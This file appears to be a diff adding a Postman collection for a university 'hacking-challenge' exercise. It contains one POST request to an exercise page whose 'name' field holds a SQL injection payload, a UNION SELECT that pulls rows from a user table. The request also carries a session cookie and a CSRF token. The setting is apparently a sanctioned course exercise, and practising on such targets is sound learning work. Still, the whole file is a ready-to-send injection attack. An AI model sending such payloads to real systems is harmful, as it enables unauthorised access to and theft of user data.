@@ -1,0 +1,61 @@
+{
+	"info": {
+		"_postman_id": "07277640-e035-4409-babd-0c6c124b9d79",
+		"name": "hacking-challenge",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "https://psw.matse.itc.rwth-aachen.de/psw/student/exercise/133/show",
+			"protocolProfileBehavior": {
+				"followOriginalHttpMethod": false,
+				"disableCookies": false
+			},
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Cookie",
+						"value": "sessionID=s%3Aj6gljgVrHNyNRA9KpnluRT11-a1h3ePD.uDa6JL0Bp74phdh0Nd4ec0sMKgnz%2BrJkoKwQWTsK4fg",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "name",
+							"value": "Paul' UNION SELECT *, 'x' FROM user #Pau",
+							"type": "text"
+						},
+						{
+							"key": "_csrf",
+							"value": "fHh1ougG-vywJOCk405GIuUNLIoCD8A3aPeI",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "https://psw.matse.itc.rwth-aachen.de/psw/student/exercise/133/show",
+					"protocol": "https",
+					"host": [
+						"psw",
+						"matse",
+						"itc",
+						"rwth-aachen",
+						"de"
+					],
+					"path": [
+						"psw",
+						"student",
+						"exercise",
+						"133",
+						"show"
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"protocolProfileBehavior": {}
+}
